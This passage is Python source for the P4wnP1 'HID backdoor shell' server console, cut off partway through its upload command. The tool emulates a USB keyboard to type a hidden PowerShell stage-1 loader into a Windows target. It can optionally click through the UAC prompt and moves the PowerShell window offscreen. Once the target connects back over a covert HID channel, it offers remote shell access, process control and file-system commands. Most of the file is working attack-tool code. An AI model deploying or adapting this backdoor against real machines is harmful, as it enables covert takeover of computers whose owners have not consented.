#!/usr/bin/python


#    This file is part of P4wnP1.
#
#    Copyright (c) 2017, Marcus Mengs. 
#
#    P4wnP1 is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.
#
#    P4wnP1 is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.
#
#    You should have received a copy of the GNU General Public License
#    along with P4wnP1.  If not, see <http://www.gnu.org/licenses/>.

import time
import cmd
import sys
import os
import Queue
import struct
from pydispatch import dispatcher
from LinkLayer  import LinkLayer
from TransportLayer import TransportLayer
from threading import Thread, Condition, Event
#from BlockingQueue import BlockingQueue
from DuckEncoder import DuckEncoder
from Config import Config
from StageHelper import StageHelper
from StructHelper import StructHelper
from Channel import * 
from Client import *
from FileSystem import *

class P4wnP1(cmd.Cmd):
	"""
	Maybe this is the class implementing P4wnP1 HID channel user prompt
	... maybe not, who knows ?!
	"""

	DEBUG = False

	CLIENT_TIMEOUT_MS = 1000 # if this value is reached, the client is regarded as disconnected

	# message types from CLIENT (powershell) to server (python)
	CTRL_MSG_FROM_CLIENT_RESERVED = 0
	CTRL_MSG_FROM_CLIENT_REQ_STAGE2 = 1
	CTRL_MSG_FROM_CLIENT_RCVD_STAGE2 = 2
	CTRL_MSG_FROM_CLIENT_STAGE2_RUNNING = 3
	CTRL_MSG_FROM_CLIENT_RUN_METHOD_RESPONSE = 4 # response from a method ran on client
	#CTRL_MSG_FROM_CLIENT_ADD_CHANNEL = 5
	CTRL_MSG_FROM_CLIENT_RUN_METHOD = 6 # client tasks server to run a method
	CTRL_MSG_FROM_CLIENT_DESTROY_RESPONSE = 7
	CTRL_MSG_FROM_CLIENT_PROCESS_EXITED = 8
	CTRL_MSG_FROM_CLIENT_CHANNEL_SHOULD_CLOSE = 9
	CTRL_MSG_FROM_CLIENT_CHANNEL_CLOSED = 10

	# message types from server (python) to client (powershell)
	CTRL_MSG_FROM_SERVER_STAGE2_RESPONSE = 1000
	#CTRL_MSG_FROM_SERVER_SEND_OS_INFO = 1001
	#CTRL_MSG_FROM_SERVER_SEND_PS_VERSION = 1002
	CTRL_MSG_FROM_SERVER_RUN_METHOD = 1003 # server tasks client to run a method
	#CTRL_MSG_FROM_SERVER_ADD_CHANNEL_RESPONSE = 1004
	CTRL_MSG_FROM_SERVER_RUN_METHOD_RESPONSE = 1005 # response from a method ran on server
	CTRL_MSG_FROM_SERVER_DESTROY = 1006 # response from a method ran on server
	CTRL_MSG_FROM_SERVER_CLOSE_CHANNEL = 1007

	def __init__(self, linklayer, transportlayer, config,  stage2 = "", duckencoder = None):
		# state value to inform sub threads of running state
		self.running = False	
		self.stage2=stage2
		self.config =  config

		self.client = Client() # object to monitor state of remote client
		self.client.registerCallbackOnConnectChange(self.onClientConnectStateChange)

		#self.control_sysinfo_response = BlockingQueue("CONTROL_SERVER_SYSINFO_RESPONSE")

		self.server_thread_in = Thread(target = self.__input_handler, name = "P4wnP1 Server Input Loop", args = ( ))
		self.server_thread_out = Thread(target = self.__output_handler, name = "P4wnP1 Server Output Loop", args = ( ))

		self._next_client_method_id = 1

		self.tl = transportlayer
		self.ll = linklayer

		self.__pending_server_methods = {}

		self.duckencoder = duckencoder
		
		# register Listener for LinkLayer signals to upper layers (to receive LinkLayer connection events)
		dispatcher.connect(self.signal_handler_transport_layer, sender="TransportLayerUp")
		
		self.client_connected_commands = ["ls", "pwd", "cd", "shell", "CreateProc", "interact", "download", "upload", "echotest", "GetClientProcs", "KillClient", "KillProc"]
		self.setPrompt(False, False)
		cmd.Cmd.__init__(self)
		
		
		self.intro = '''=================================
P4wnP1 HID backdoor shell
Author: MaMe82
Web: https://github.com/mame82/P4wnP1
State: Experimental (maybe forever ;-))

Enter "help" for help
Enter "FireStage1" to run stage 1 against the current target.
Use "help FireStage1" to get more details.
=================================
'''
		
	def precmd(self, line):
		cmd, args, remain = self.parseline(line)
		if not cmd:
			return line
		if cmd in self.client_connected_commands:
			if not self.client.isConnected():
				print ""
				print "Command '{0}' could only be called with a client connected.".format(cmd)
				print "--------------------------------------------------------------"
				print ""
				print "Use 'SetKeyboardLanguage' to switch to your targtes keyboard"
				print "layout and run 'FireStage1' to connect via HID covert channel."
				print "--------------------------------------------------------------"
				print ""
				return ""		
		return line

	def setPrompt(self, connectState,  reprint = True):
		if connectState:
			self.prompt = "P4wnP1 shell (client connected) > "
		else:
			self.prompt = "P4wnP1 shell (client not connected) > "
		if reprint:
			self.print_reprompt()
			
	def print_reprompt(self, text = ""):
		if len(text) > 0:
			print text
		sys.stdout.write(self.prompt)
		sys.stdout.flush()
		

	@staticmethod
	def print_debug(str):
		if P4wnP1.DEBUG:
			print "P4wnP1 Server (DEBUG): {}".format(str)

	########################
	# Internal methods of P4wnP1 server
	##########################
	
	def sendControlMessage(self, ctrl_message_type, payload = None):
		ctrl_channel = 0

		# construct header
		ctrl_message = struct.pack("!II", ctrl_channel, ctrl_message_type)

		# append payload
		if payload:
			ctrl_message += payload

		self.tl.write_stream(ctrl_message)
	
	def interactWithClientProcess(self, pid):
		print "Trying to interact with process ID {0} ...".format(pid)
		proc = self.client.getProcess(pid)
		if not proc:
			print "PID {0} not found or process not managed by P4wnP1".format(pid)
			return


		import select
		
		interacting = True
		proc.setInteract(True) # let the process object inform the channel that stdout and stderr should be used
		while interacting:
			if not self.client.isConnected():
				interacting = False
				print "\nClient disconnected, stop interacting"
				break
			if proc.hasExited:
				print "\nProcess exited... stopping interaction"
				if proc.keepTillInteract:
					self.client.removeProc(proc.id)
				break

			try:
				#input = getpass.getpass()
				# only read key if data available in stdin(avoid blocking stdout)
				if select.select([sys.stdin], [], [], 0.05)[0]: # 50 ms timeout, to keep CPU load low
					input = sys.stdin.readline()
					print input
					proc.writeStdin(input)
			except KeyboardInterrupt:
				interacting = False
				proc.setInteract(False)
				print "\nInteraction stopped by keyboard interrupt.\nTo continue interaction use 'interact'."

	#def addChannel(self, payload):
		#'''
		#Client requested new channel, add it...
		#'''
		
		#ch_id, ch_type, ch_encoding  = struct.unpack("!IBB", payload)

		#P4wnP1.print_debug("Server add channel request. Channel id '{0}', type {1}, encoding {2}".format(ch_id, ch_type, ch_encoding))

	def onClientConnectStateChange(self, state):
		#print "Client connect state: {0}".format(state)
		if state:
			print "\nTarget connected through HID covert channel\n"
		else:
			print "\nTarget disconnected"
		self.setPrompt(state)
	
	def onClientProcessExitted(self, payload):
		# fetch proc id
		proc_id = struct.unpack("!I", payload)[0]
		proc = self.client.getProcess(proc_id)
		if proc:
			proc.hasExited = True
			self.print_reprompt("Proc with id {0} exited".format(proc_id))
			if not proc.keepTillInteract:
				self.client.removeProc(proc_id)
	
	def get_next_method_id(self):
		next = self._next_client_method_id
		# increase next_method id and cap to 0xFFFFFFFF
		self._next_client_method_id = (self._next_client_method_id + 1) & 0xFFFFFFFF
		return next

	def start(self):
		# start LinkLayer Threads
		print "Starting P4wnP1 server..."
		self.ll.start_background()
		
		self.running = True
		self.server_thread_in.start()
		P4wnP1.print_debug("Server input thread started.")
		self.server_thread_out.start()
		P4wnP1.print_debug("Server output thread started.")

	def stop(self):
		self.running = False

	def set_stage2(self, stage2_str):
		self.stage2 = stage2_str

	def __output_handler(self):
		while self.running:
			pending_methods = self.client.getPendingMethods()

			for method_id in pending_methods.keys():
				try:
					method = pending_methods[method_id]
				except KeyError:
					# the method was removed, because it finished execution meanwhile
					P4wnP1.print_debug("Output for the pending method with ID {0} couldn't be processed, method doesn't exist.")

				# check if method run has already been requested from client, do it if not
				if not method.run_requested:
					# request method run
					method_request = method.createMethodRequest()
					self.sendControlMessage(P4wnP1.CTRL_MSG_FROM_SERVER_RUN_METHOD, method_request)

					# mark the method with "run requested"
					method.run_requested = True
					continue # step forward to next method

				P4wnP1.print_debug("Pending method name: '{0}', ID: {1}".format(method.name, method.id))

			# process pending output from client channels
			###############################################
			pendingOut = self.client.getPendingChannelOutput()
			if len(pendingOut) > 0:
				# push data to transport layer
				for stream in pendingOut:
					self.tl.write_stream(stream)


			#time.sleep(5)
			#time.sleep(0.1)

			

	def __input_handler(self):
		while self.running:
			# processing input data


			indata = False
			bytes_rcvd = 0
			while self.tl.data_available():
				stream = self.tl.pop_input_stream()

				# deconstruct stream into channel and channel payload (network order endianess)
				ch,payload = struct.unpack("!I{0}s".format(len(stream) - 4), stream)

				if (ch == 0):
					# control channel, extract control message type
					msg_type,payload = struct.unpack("!I{0}s".format(len(payload) - 4), payload)
			
					if msg_type == P4wnP1.CTRL_MSG_FROM_CLIENT_REQ_STAGE2:
						P4wnP1.print_debug("indata: Control channel, control message STAGE2 REQUEST")
						self.client.setStage2("REQUESTED")
						# we send stage 2
						response = struct.pack("!II{0}s".format(len(self.stage2)), 0, P4wnP1.CTRL_MSG_FROM_SERVER_STAGE2_RESPONSE, self.stage2) # send back stage 2 as string on channel 0 (control channel) ...
						self.tl.write_stream(response) # ... directly to transport layer
					elif msg_type == P4wnP1.CTRL_MSG_FROM_CLIENT_RCVD_STAGE2:
						self.client.setStage2("RECEIVED")
					elif msg_type == P4wnP1.CTRL_MSG_FROM_CLIENT_STAGE2_RUNNING:
						self.client.setStage2("RUNNING")
						self.client.setConnected(True)
					elif msg_type == P4wnP1.CTRL_MSG_FROM_CLIENT_RUN_METHOD_RESPONSE:
						# handle method response
						self.client.deliverMethodResponse(payload)
					#elif msg_type == P4wnP1.CTRL_MSG_FROM_SERVER_SEND_OS_INFO:
						#self.client.setOSInfo(payload)
					#elif msg_type == P4wnP1.CTRL_MSG_FROM_SERVER_SEND_PS_VERSION:
						#self.client.setPSVersion(payload)
					#elif msg_type == P4wnP1.CTRL_MSG_FROM_CLIENT_ADD_CHANNEL:
						#self.addChannel(payload)
					elif msg_type == P4wnP1.CTRL_MSG_FROM_CLIENT_DESTROY_RESPONSE:
						self.print_reprompt("Client received terminate!")
						self.client.setConnected(False)
					elif msg_type == P4wnP1.CTRL_MSG_FROM_CLIENT_RUN_METHOD:
						#print "Run method request with following payload received: {0} ".format(repr(payload))
						pass
					elif msg_type == P4wnP1.CTRL_MSG_FROM_CLIENT_PROCESS_EXITED:
						self.onClientProcessExitted(payload)
					elif msg_type == P4wnP1.CTRL_MSG_FROM_CLIENT_CHANNEL_SHOULD_CLOSE:
						channel_id = struct.unpack("!I", payload)[0]
						self.print_reprompt("Client sent channel close request for channel ID {0}, removing channel from server...".format(channel_id))
						self.client.removeChannel(channel_id)
						# send back request to close remote channel, too
						self.sendControlMessage(P4wnP1.CTRL_MSG_FROM_SERVER_CLOSE_CHANNEL, struct.pack("!I", channel_id))
					elif msg_type == P4wnP1.CTRL_MSG_FROM_CLIENT_CHANNEL_CLOSED:
						channel_id = struct.unpack("!I", payload)[0]
						self.print_reprompt("Client confirmed close of remote channel with ID {0}!".format(channel_id))
					
					else:
						P4wnP1.print_debug("indata: Control channel, unknown control message type: {0}, payload: {1} ".format(msg_type, repr(payload)))

				else:
					# as this is not a control channel, it has to be handled by the client object
					#P4wnP1.print_debug("indata: for unknown channel channel {0}, payload: {1} ".format(ch, repr(payload)))
					#P4wnP1.print_debug("indata: for channel channel {0}, payload: {1} ".format(ch, repr(payload)))
					self.client.sendToInputChannel(ch, payload)



	# loose definition, data argument has to be produced by LinkLayer
	def signal_handler_transport_layer(self, signal, data):
		P4wnP1.print_debug("TransportLayer signal: {0}".format(signal))

		if signal == "TransportLayerClientConnectedLinkLayer":
			# connection established
			self.client.setLink(True)
		elif signal == "TransportLayerConnectionResetLinkLayer":
			#self.client.setConnected(False)
			self.client.setLink(False)
		elif signal == "TransportLayerConnectionTimeoutLinkLayer":
			if data >= P4wnP1.CLIENT_TIMEOUT_MS:
				self.print_reprompt("\nClient didn't respond for {0} seconds.".format(data/1000))
				self.ll.restart_background()
				self.client.setLink(False)
		elif signal == "TransportLayerWaitingForClient" or signal == "TransportLayerSendStream":
			# ignore these events
			pass
		else:
			P4wnP1.print_debug("Unhandled LinkLayer signal: {0}".format(signal))

	
		

	# overwrite cmd.emptyline()
	def emptyline(self):
		# do nothing
		pass




	#def handler_client_method_response(self, response):
		## test handler, print response
		#print "Testhandler for client method, result:  " + repr(response)

	def killCLient(self):
		self.sendControlMessage(P4wnP1.CTRL_MSG_FROM_SERVER_DESTROY)
	
	def stage1_trigger(self, trigger_type=1, trigger_delay_ms=1000,  hideTargetWindow = True,  bypassUAC = False):
		'''
		Triggers Stage 1 either with pure PowerShell using reflections (trigger_type = 1)
		or with PowerShell invoking a .NET assembly, running stage1 (trigger_type = 2)
		
		trigger_type 1:
		  Is faster, because less keys have to be printed out. As the PowerShell
		  isn't cpable of reading serial and manufacturer of a USB HID composite device, PID
		  and VID have to be prepended in front of the payload.
		  
		trigger_type 2:
		  Is slower, because around 6000 chars have to be printed to build the needed assembly. 
		  There's no need to account on PID and VID, as the code is using the device serial "deadbeefdeadbeef"
		  and the manufacturer "MaMe82".
		'''
	
		gadget_dir = "/sys/kernel/config/usb_gadget/mame82gadget/"
		
		ps_stub ='''
	                GUI r
	                DELAY 500
	                STRING powershell.exe
	                ENTER
	        '''		
		ps_stub += "DELAY " + str(trigger_delay_ms) + "\n"
		
		if bypassUAC:
			# confirm UAC dialog with "SHIFT+TAB, ENTER" to be language independent (no "ALT+Y")
			ps_stub += '''
				STRING start powershell -verb runas;exit
				ENTER
				DELAY 500

				SHIFT TAB
				DELAY 100
				ENTER
		'''
			# use trigger delay once more
			ps_stub += "DELAY " + str(trigger_delay_ms) + "\n"
		
		ps_script = ""
		
		if hideTargetWindow:
			# move window offscreen + hide it + post request to owning window
			ps_script += StageHelper.out_PS_SetWindowPos(x=-100, y=-100, cx=80, cy=80, flags=0x4000+0x80) + "\n"
			#ps_script += StageHelper.out_PS_SetWindowPos(x=100, y=100, cx=80, cy=80, flags=0x4) + "\n"

		
		if trigger_type == 1:
			# read PID and VID
			pid=""
			with open(gadget_dir+"idProduct","r") as f:
				pid=f.read()
				pid=(pid[2:6]).upper()
				
			vid=""
			with open(gadget_dir+"idVendor","r") as f:
				vid=f.read()
				vid=(vid[2:6]).upper()
				
			ps_script += "$USB_VID='{0}';$USB_PID='{1}';".format(vid, pid) 
			
			with open(self.config["PATH_STAGE1_PS"],"rb") as f:	
				ps_script += StageHelper.out_PS_IEX_Invoker(f.read())
		elif trigger_type == 2:
			# slower .NET dll based stage 1
			ps_script += StageHelper.out_PS_Stage1_invoker(self.config["PATH_STAGE1_DOTNET"])
					
		self.duckencoder.outhidDuckyScript(ps_stub) # print DuckyScript stub
		self.duckencoder.outhidStringDirect(ps_script + ";exit\n") # print stage1 PowerShell script			
		
		
	
	###################
	# caller methods and handlers for remote client methods
	#####################

	# CALLERS
	def client_call_echo(self, echostring):
		self.client.callMethod("core_echo", echostring, self.handler_client_echotest, waitForResult = True)

	def client_call_get_proc_list(self, waitForResult = False):
		self.client.callMethod("core_get_client_proc_list", "", self.handler_client_get_proc_list, waitForResult = waitForResult)
		
	def client_call_create_shell_proc(self, shell="cmd.exe"):
		args=""
		method_args = struct.pack("!B{0}sx{1}sx".format(len(shell), len(args)), 1, shell, args) # create null terminated strings from process name and args
		# we could use the create proc handler
		no_error, proc = self.client.callMethod("core_create_proc", method_args, self.handler_client_create_shell_proc, waitForResult = True, deliverResult = True)
		if no_error:
			if proc:
				self.interactWithClientProcess(proc.id)
		else:
			self.print_reprompt("Trying to create the process resulted in error: {0}".format(proc))

	def client_call_create_proc(self, filename, args, use_channels = True, waitForResult = False):
		# build arguments: [String] ProcFilename + [String] ProcArgs
		use_channels_byte = 0
		if use_channels:
			use_channels_byte = 1
		method_args = struct.pack("!B{0}sx{1}sx".format(len(filename), len(args)), use_channels_byte, filename, args) # create null terminated strings from process name and args

		self.client.callMethod("core_create_proc", method_args, self.handler_client_create_proc, waitForResult = waitForResult)
		
	def client_call_kill_proc(self, proc_id):
		method_args = struct.pack("!I", proc_id)

		self.client.callMethod("core_kill_proc", method_args, self.handler_client_kill_proc, waitForResult = False)	

	def client_call_inform_channel_added(self, channel):
		self.client.callMethod("core_inform_channel_added", struct.pack("!I", channel.id), self.handler_client_inform_channel_added, waitForResult = False)
		
	def client_call_destroy_channel(self, channel):
		self.client.callMethod("core_destroy_channel", struct.pack("!I", channel.id), self.handler_client_destroy_channel, waitForResult = False)	
		
	# HANDLER
	def handler_pass_through_result(self, response):
		return response
	
	def handler_client_echotest(self, response):
		print response

	def handler_client_get_proc_list(self, response):
		print response.replace("\r\n", "\n")
		
	def handler_client_create_shell_proc(self, response):
		return self.handler_client_create_proc(response)
	
	def handler_client_kill_proc(self, response):
		#pid = struct.unpack("!I", response)[0]
		#proc =  self.client.getProcess(pid)
		#if proc:
			#self.client.removeChannel(proc.ch_stdin.id)
			#self.client.removeChannel(proc.ch_stderr.id)
			#self.client.removeChannel(proc.ch_stdout.id)
		pass		
		
	def handler_client_create_proc(self, response):
		proc_id, uses_channels, ch_stdin, ch_stdout, ch_stderr = struct.unpack("!IBIII", response)

		uses_channels = bool(uses_channels) # convert bool

		if uses_channels:
			P4wnP1.print_debug("Process created channels, PID: {0}, CH_STDIN: {1}, CH_STDOUT: {2}, CH_STDERR: {3}".format(proc_id, ch_stdin, ch_stdout, ch_stderr))
			
			# we keep track of the process channels in client state, thus we create and add channels

			# create STDIN channel
			ch_stdin = Channel(ch_stdin, Channel.TYPE_OUT, Channel.ENCODING_UTF8) # from our perspective, this is an OUT channel (IN on client)
			# create STDOUT channel
			ch_stdout = Channel(ch_stdout, Channel.TYPE_IN, Channel.ENCODING_UTF8) # from our perspective, this is an IN channel (OUT on client)
			# create STDERR channel
			ch_stderr = Channel(ch_stderr, Channel.TYPE_IN, Channel.ENCODING_UTF8) # from our perspective, this is an IN channel (OUT on client)

			self.client.addChannel(ch_stdin)
			self.client.addChannel(ch_stdout)
			self.client.addChannel(ch_stderr)

			proc = ClientProcess(proc_id, ch_stdin, ch_stdout, ch_stderr)

			self.client.addProc(proc)
			
			
			#self.client.callMethod("core_inform_channel_added", struct.pack("!I", ch_stdin.id), self.handler_core_inform_channel_added, waitForResult = False)
			#self.client.callMethod("core_inform_channel_added", struct.pack("!I", ch_stdout.id), self.handler_core_inform_channel_added, waitForResult = False)
			#self.client.callMethod("core_inform_channel_added", struct.pack("!I", ch_stderr.id), self.handler_core_inform_channel_added, waitForResult = False)
			
			self.client_call_inform_channel_added(ch_stdin)
			self.client_call_inform_channel_added(ch_stderr)
			self.client_call_inform_channel_added(ch_stdout)
		
			print "Process with ID {0} created".format(proc_id)
			return proc
		else:
			print "Process created without channels, PID: {0}".format(proc_id)

	def handler_client_inform_channel_added(self, response):
		P4wnP1.print_debug("Channel added inform " + repr(response))
		
	def handler_client_destroy_channel(self, response):
		channel_id =  struct.unpack("!I",  response)[0]
		self.client.removeChannel(channel_id)
		
	
	###################
	# interface methods callable from P4wnP1 console
	#####################


	def do_KillProc(self, line):
		'''
	Try to kill the given remote process
	'''
		try:
			proc_id = int(line)
			self.client_call_kill_proc(proc_id)
		except ValueError:
			print "{0} is not a process id".format(line)
		


	def do_KillClient(self, line):
		'''
	Try to kill the remote client
	'''

		if not self.client.isConnected():
			print "This doesn't make sense, there's no client connected"
			return
		
		self.killCLient()

	def do_CreateProc(self, line):
		'''
		This remote Powershell method calls "core_create_proc" in order to create a remote process
		The response is handled by "handler_client_core_create_proc()"
		'''

		if not self.client.isConnected():
			print "Not possible, client not connected"
			return

		if " " in line:
			proc_name, proc_args = line.split(" ",1)
		else:
			proc_name = line
			proc_args = ""

		self.client_call_create_proc(proc_name, proc_args, use_channels = True, waitForResult = False)

	def do_GetClientProcs(self, line):
		'''
		Print a list of processes managed by the remote client
		'''

		if not self.client.isConnected():
			print "Not possible, client not connected"
			return

		self.client_call_get_proc_list(waitForResult = True)

	def do_shell(self, line):
		if not self.client.isConnected():
			print "Not possible... Run 'FireStage1' first, to get the target connected"
			return
		if "powershell" in line.lower():
			self.client_call_create_shell_proc("powershell.exe")
		else:
			self.client_call_create_shell_proc()

		
	#def do_run_method(self, line):
		#if " " in line:
			#method_name, method_args = line.split(" ",1)
		#else:
			#method_name = line
			#method_args = ""

		#self.client.callMethod(method_name, method_args, self.handler_client_method_response)
		
	def do_SendKeys(self, line):
		'''
	Prints out everything on target through HID keyboard. Be sure
	to set the correct keyboard language for your target  (use 
	'GetKeyboardLanguage' and 'SetKeyboardLanguage' commands.).
	'''
		self.duckencoder.outhidStringDirect(line)
	
	def do_FireStage1(self, line):
		'''
	usage: FireStage1 <trigger_type> <trigger_delay in milliseconds> [nohide] [uac]
	
	Fires stage 1 via HID keyboard against a PowerShell process
	on a Windows client.
	The code downloads stage 2 and after successfull execution 
	commands like "shell" could be used, to get a remote shell 
	(communictaing through HID covert channel only).
	
	THE KEYBOARD LANGUAGE HAS TO BE SET ACCORDING TO THE TARGETS 
	KEYBOARD LAYOUT, TO MAKE THIS WORK (use 'GetKeyboardLanguage' 
	and 'SetKeyboardLanguage' commands.)
	
	
	trigger_type = 1 (default):
	  Is faster, because less keys have to be printed out. As the
	  PowerShell script isn't capable of reading serial and 
	  manufacturer of a USB HID composite device, PID  and VID have 
	  to be prepended in front of the payload. This leaves a larger 
	  footprint.
	  
	trigger_type = 2:
	  Is slower, because around 6000 chars have to be printed to 
	  build the needed assembly. There's no need to account on PID 
	  and VID, as the code is using the device serial "deadbeef
	  deadbeef" and the manufacturer "MaMe82". These are hardcoded
	  in the assembly, and leave a smaller footprint (not ad-hoc 
	  readable, if powershell script content is logged).
	  
	trigger_delay (default 1000):
	  The payload is started by running powershell.exe and directly
	  entering the script with HID keyboard.
	  This part is critical, as if keystrokes get lost the initial
	  stage won't execute. This could be caused by user interaction
	  during stage 1 typeout or due to PowerShell.exe starting too
	  slow and thus getting ready for keyboard input too late. 
	  The latter case could be handled by increasing the trigger delay,
	  to give the target host more time between start of powershell
	  nd start of typing out stage1.
	  The value defaults to 1000 ms if omitted.
	  
	nohide
	  If "nohide" is added, the stup hiding the powershell window on
	  the target is omited
	  
	uac
	  If "uac" is added P4wnP1 tries to run an elevated PowerShell
	  session homing the payload.
	  
	  Caution: The target user has to be member of the "Local
	  Administrators" group, otherwise this would fail.
	  The option is disabled by default.
	  '''
		
		arg_error="Wrong arguments given"
		trigger_type = 1
		trigger_delay_ms = 1000
		args = line.split(" ")
		if len(args) == 1 and len(line) > 0:
			try:
				trigger_type = int(args[0])
			except ValueError:
				print arg_error
		elif len(args) == 2:
			try:
				trigger_type = int(args[0])
				trigger_delay_ms = int(args[1])
			except ValueError:
				print arg_error

		hideTargetWindow = True
		if "nohide" in line.lower():
			hideTargetWindow = False
			
		bypassUAC = False
		if "uac" in line.lower():
			bypassUAC = True		
			
		print "Starting to type out stage1 to the target..."
		self.stage1_trigger(trigger_type=trigger_type, trigger_delay_ms=trigger_delay_ms, hideTargetWindow = hideTargetWindow, bypassUAC=bypassUAC)
		print "...done. If the client doesn't connect back, check the target"
		print "keyboard layout with 'SetKeyboardLanguage'"
		
	def do_SetKeyboardLanguage(self, line):
		'''
	Sets the language for target keyboard interaction.
	Possible values: 
	  be, br, ca, ch, de, dk, es, fi, fr, gb, hr, it,
	  no, pt, ru, si, sv, tr, us
	'''
		singleprint = False
		if len(line) >  0:
			self.duckencoder.setLanguage(line.lower())
			singleprint =  True
		
		current_language = self.duckencoder.getLanguage()
		# fetch possible languages
		hasChosen =  False
		available_langs = [lang.replace(".properties",  "") for lang in FileSystem.ls(self.config["PATH_LANGUAGES"]) if lang != "keyboard.properties"]
		per_line = 8
		langNum =  0
		
		singleprint = False
		if len(line) > 0 and line.lower() in available_langs:
			self.duckencoder.setLanguage(line.lower())
			singleprint =  True
		
		
		while not hasChosen:
			# print available languages
			print "Choose language by number or name:"
			print "================================\n"
			index = 0
			for i in range(0, len(available_langs), per_line):
				line =  ""
				for j in range(per_line):
					index = i + j
					if index >= len(available_langs):
						break
					if available_langs[index] ==  current_language:
						line += "[{0}:{1}]\t".format(index,  available_langs[index])
					else:
						line += "{0}:{1}  \t".format(index,  available_langs[index])
				print line

			if singleprint:
				break

			given = raw_input("Your selection or 'x' to abort: ")
			if given == "x":
				print "abort ..."
				return
			# try to choose by name
			if given in available_langs:
				langNum =  available_langs.index(given)
				hasChosen =  True
				break		
			
			# try to choose by number
			try:
				langNum = int(given)
				if langNum >= 0 and langNum < len(available_langs):
					hasChosen =  True
					break
				else:
					print "Invalid input..."
					continue						
			except ValueError:
				print "Invalid input..."
				continue
		
		if hasChosen:
			print self.duckencoder.setLanguage(available_langs[langNum])
		else:
			return			
		
		
		
	def do_GetKeyboardLanguage(self, line):
		'''
	Shows which language is set for HID keyboard.
	'''
		print self.duckencoder.getLanguage()

	def do_interact(self, line):
		if not self.client.isConnected():
			print "Not possible, client not connected"
			return

		pid = line.split(" ")[0]
		if pid == "":
			print "No process ID given, choose from:"
			procs = self.client.getProcsWithChannel()
			for p in procs:
				if p.hasExited:
					print "{0} (exited, interact to see final output)".format(p.id)
				else:
					print "{0}".format(p.id)
			return

		try:
			pid = int(pid.strip())
		except ValueError:
			print "No valid process id: {0}".format(pid)
			return

		self.interactWithClientProcess(pid)
			
	def do_exit(self, line):
		print "Exitting..."
		# self.ll.stop() # should happen in global finally statement
		sys.exit()

	def do_state(self, line):
		self.client.print_state()
	def do_echotest(self, line):
		'''
	If the client is connected, command arguments given should be reflected back.
	Communications happen through a pure HID covert channel.
	'''
		
		self.client_call_echo(line)
		
	def do_SendDuckyScript(self, line):
		scriptpath = self.config["PATH_DUCKYSCRIPT"] +  "/" +  line
		
		if not FileSystem.fileExists(scriptpath):
			print "No script given or given script not found"
			hasChosen =  False
			scriptNum =  0
			available_scripts =  FileSystem.ls(self.config["PATH_DUCKYSCRIPT"])
			while not hasChosen:
				# print out available scripts
				print "Choose script by number or name:"
				print "================================\n"
				for i in range(len(available_scripts)):
					print "{0}:\t{1}".format(i, available_scripts[i])

				given = raw_input("Your selection or 'x' to abort: ")
				if given == "x":
					print "abort ..."
					return
				# try to choose by name
				if given in available_scripts:
					scriptNum =  available_scripts.index(given)
					hasChosen =  True
					break
				# try to choose by number
				try:
					scriptNum = int(given)
					if scriptNum >= 0 and scriptNum < len(available_scripts):
						hasChosen =  True
						break
					else:
						print "Invalid input..."
						continue						
				except ValueError:
					print "Invalid input..."
					continue
			
			if hasChosen:
				scriptpath = self.config["PATH_DUCKYSCRIPT"] +  "/" +  available_scripts[scriptNum]
			else:
				return
		
		# read in script
		script = ""
		with open(scriptpath, "r") as f:
			script = f.read()
			
		# execute script
		self.duckencoder.outhidDuckyScript(script)
		
	def do_lcd(self,  line):
		print FileSystem.cd(line)
		
	def do_lpwd(self,  line):
		print FileSystem.pwd()
		
	def do_lls(self,  line):
		if len(line.strip()) >  0:
			res = FileSystem.ls_native2(line.split(" "))
		else:
			res = FileSystem.ls_native2()
		for l in res:
			print l
			

	def client_call_open_file(self, remote_filename, remote_filemode, remote_fileaccess):			
		method_args = struct.pack("!{0}sxBB".format(len(remote_filename)), remote_filename, remote_filemode, remote_fileaccess)
			
		# we could use the create proc handler
		return self.client.callMethod("core_fs_open_file", method_args, self.handler_pass_through_result, error_handler=self.handler_pass_through_result, waitForResult = True, deliverResult = True)
	
	def client_call_close_stream(self, stream_id):			
		method_args = struct.pack("!i", stream_id)
			
		# we could use the create proc handler
		return self.client.callMethod("core_fs_close_stream", method_args, self.handler_pass_through_result, error_handler=self.handler_pass_through_result, waitForResult = True, deliverResult = True)
	
	def client_call_open_stream_channel(self, stream_id, passthrough = True):
		pt = 1
		if not passthrough:
			pt = 0
		method_args = struct.pack("!iB", stream_id, pt)
		# we could use the create proc handler
		return self.client.callMethod("core_open_stream_channel", method_args, self.handler_pass_through_result, error_handler=self.handler_pass_through_result, waitForResult = True, deliverResult = True)
	
	def client_call_FS_command(self, command,  command_args=""):
		# remote_file_target: 0=disc, 1=in_memory
		method_args = struct.pack("!{0}sx{1}sx".format(len(command), len(command_args)), command,  command_args)
			
		# we could use the create proc handler
		no_err, result = self.client.callMethod("core_call_fs_command", method_args, self.handler_pass_through_result, error_handler=self.handler_pass_through_result, waitForResult = True, deliverResult = True)
		result, _ =  StructHelper.extractNullTerminatedString(result)
		if no_err:
			print result
		else:
			print "Remote file system error: {0}".format(result)

	
	def do_pwd(self, line):
		self.client_call_FS_command("pwd")
		
	def do_ls(self, line):
		self.client_call_FS_command("ls", line)
		
	def do_cd(self, line):
		self.client_call_FS_command("cd", line)			

	@staticmethod
	def askYesNo(default_yes = False):
		given = ""
		valid =  False
		while not valid:
			if default_yes:
				given = raw_input("(y)es / (n)o, default yes: ")
				if not given:
					given = "y"
			else:
				given = raw_input("(y)es / (n)o, default no: ")
				if not given:
					given = "n"
				
			if given.lower() in ["y", "yes"]:
				return True
			elif given.lower() in ["n", "no"]:
				return False
			else:
				print "invalid input"
		
	
	def do_upload(self, line):
		args = line.split(" ")
		target_path = ""
		source_path = ""
		if len(args) == 0 or len(line) == 0:
			print "you need to provide a file source"
			return
		elif len(args) == 1:
			source_path = args[0].strip()
			target_path = FileSystem.getFileName(source_path)
		elif len(args) == 2:
			source_path = args[0].strip()
			target_path = args[1].strip()
		else:
			print "wrong argument count"
			return
		
		
		sourcefile =  None
		# try to open local file first
		try:
			sourcefile = FileSystem.open_local_file(source_path, FileMode.Open, FileAccess.Read)
		except Exception as e:
			print e.message
			return
		
			
		
		
		# Try to open remote file
		success, result = self.client_call_open_file(remote_filename = target_path, 
		                                            remote_filemode = FileMode.CreateNew, # don't overwrite 
		                                            remote_fileaccess = FileAccess.Write)
		stream_id = -1
		if success:
